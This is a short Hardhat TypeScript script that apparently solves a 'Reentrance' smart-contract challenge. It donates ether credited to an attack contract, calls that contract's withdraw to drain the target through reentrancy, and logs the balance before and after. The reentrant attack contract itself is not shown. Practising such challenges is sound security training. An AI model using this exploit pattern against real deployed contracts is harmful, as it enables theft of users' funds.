import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x524F04724632eED237cbA3c37272e018b3A7967e"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x63fea6E447F120B8Faf85B53cdaD8348e645D80E"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Reentrance", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("ReentranceAttack", ATTACK_ADDRESS, signer)

  console.log(ethers.formatEther(await ethers.provider.getBalance(CONTRACT_ADDRESS)))

  await contract.donate(ATTACK_ADDRESS, { value: ethers.parseEther("0.001")})
  console.log(await contract.balanceOf(ATTACK_ADDRESS))

  await attackContract.withdraw()

  console.log(ethers.formatEther(await ethers.provider.getBalance(CONTRACT_ADDRESS)))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
